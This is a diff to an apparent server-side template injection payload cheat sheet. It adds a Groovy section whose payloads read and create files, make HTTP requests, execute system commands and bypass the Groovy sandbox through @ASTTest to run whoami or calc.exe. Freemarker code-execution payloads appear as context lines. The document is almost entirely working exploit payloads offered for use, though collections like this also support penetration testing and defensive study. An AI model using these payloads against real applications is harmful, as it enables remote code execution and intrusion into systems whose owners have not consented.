@@ -15,6 +15,12 @@
 * [Freemarker](#freemarker)
   * [Basic injection](#freemarker---basic-injection)
   * [Code execution](#freemarker---code-execution)
+* [Groovy](#groovy)
+  * [Basic injection](#groovy---basic-injection)
+  * [Read/Create file](#groovy---read-and-create-file)
+  * [HTTP Request](#groovy---http-request)
+  * [Command execution](#groovy---command-execution)
+  * [Sandbox bypass](#groovy---sandbox-bypass)
 * [Handlebars](#handlebars)
 * [Jade / Codepen](#jade--codepen)
 * [Java](#java)
@@ -180,6 +186,56 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
 <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
 ${dwf.newInstance(ec,null)("id")}
+```
+
+---
+
+## Groovy
+
+[Official website](https://groovy-lang.org/)
+
+
+### Groovy - Basic injection
+
+Refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.
+
+
+### Groovy - Read and create File
+
+```groovy
+String x = new File('c:/windows/notepad.exe').text
+String x = new File('/path/to/file').getText('UTF-8')
+new File("C:\Temp\FileName.txt").createNewFile();
+```
+
+### Groovy - HTTP request:
+
+
+```groovy
+"http://www.google.com".toURL().text
+new URL("http://www.google.com").getText()
+```
+
+### Groovy - Command Execution
+
+```groovy
+"calc.exe".exec()
+"calc.exe".execute()
+this.evaluate("9*9") //(this is a Script)
+new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()
+```
+
+### Groovy - Sandbox Bypass
+
+```groovy
+@ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
+def x
+```
+
+or
+
+```groovy
+new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
 ```
 
 ---
